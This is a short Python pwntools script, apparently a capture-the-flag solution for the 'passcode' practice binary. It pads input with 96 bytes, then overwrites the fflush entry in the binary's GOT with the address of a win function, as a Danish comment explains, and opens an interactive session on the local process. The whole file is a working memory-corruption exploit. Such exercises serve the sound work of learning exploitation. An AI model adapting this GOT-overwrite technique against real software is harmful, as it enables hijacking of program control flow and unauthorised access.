from pwn import ELF, p32, process, cyclic

elf = ELF("./passcode")
fflush = elf.got["fflush"]
print(hex(fflush))
win = str(0x080485D7).encode()
offset = cyclic(96)

# overskriver altså fflush addressen i GOT table med win addressen
pay = offset + p32(fflush) + win

# with open("payload", "wb") as f:
#     f.write(pay)
p = process("./passcode")
p.sendline(pay)
p.interactive()
